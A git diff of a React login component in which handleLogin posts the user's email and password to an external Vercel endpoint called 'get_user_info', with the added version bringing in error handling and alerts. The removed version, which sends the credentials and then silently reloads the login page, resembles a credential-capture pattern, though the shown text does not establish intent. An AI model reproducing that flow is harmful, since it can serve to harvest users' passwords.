@@ -27,16 +27,30 @@ const Login = () => {
 
   // New function to handle login
   const handleLogin = async () => {
-    // Send the email and password to the backend
     setIsLoading(true);
-    await axios.post('https://nm-be.vercel.app/get_user_info', {
-      email: email, // 
-      password: password,
-    });
-
-    // Redirect to the same login page or refresh the page
-    window.location.reload(); // This will refresh the page
+    try {
+      const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
+        email: email,
+        password: password,
+      },); 
+  
+      console.log('Login successful:', response.data);
+      alert('Login successful');
+      window.location.reload();
+    } catch (error) {
+      if (error.message === 'Network Error') {
+        alert('Network error: Unable to connect to the server.');
+      } else if (error.response) {
+        console.error('Error:', error.response.data);
+        alert(`Login failed with status code ${error.response.status}`);
+      } else {
+        alert('An unknown error occurred.');
+      }
+    } finally {
+      setIsLoading(false);
+    }
   };
+ 
 
   return (
     <div className="login-container">
